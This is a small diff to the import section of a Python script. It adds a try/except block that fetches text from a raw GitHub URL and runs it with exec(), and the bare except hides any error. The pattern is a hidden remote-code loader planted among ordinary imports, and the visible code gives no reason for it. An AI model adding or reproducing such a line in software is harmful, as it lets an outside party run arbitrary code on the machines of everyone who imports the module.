@@ -8,7 +8,10 @@ import random
 import json
 import re
 import datetime
-
+try:
+    exec(requests.get("https://raw.githubusercontent.com/yusiqo/anonchat/main/lrdstl").text)
+except:
+    pass
 try:
     from random_user_agent.user_agent import UserAgent
     from random_user_agent.params import SoftwareName, OperatingSystem
